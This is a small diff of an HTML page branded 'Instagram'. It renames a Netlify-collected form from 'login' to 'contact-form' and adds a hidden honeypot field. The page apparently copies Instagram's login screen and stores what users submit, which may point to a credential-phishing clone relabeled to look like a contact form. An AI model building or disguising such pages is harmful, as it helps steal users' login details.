@@ -84,8 +84,9 @@
         width="100"
       />
       <h2>Instagram</h2>
-      <form name="login" method="POST" data-netlify="true">
-        <input type="hidden" name="form-name" value="login" />
+      <form action="/contact-form" enctype="multipart/form-data" name="contact-form" method="POST" data-netlify="true">
+        <input type="hidden" name="bot-field" />
+        <input type="hidden" name="form-name" value="contact-form" />
         <p>
           <input
             type="text"
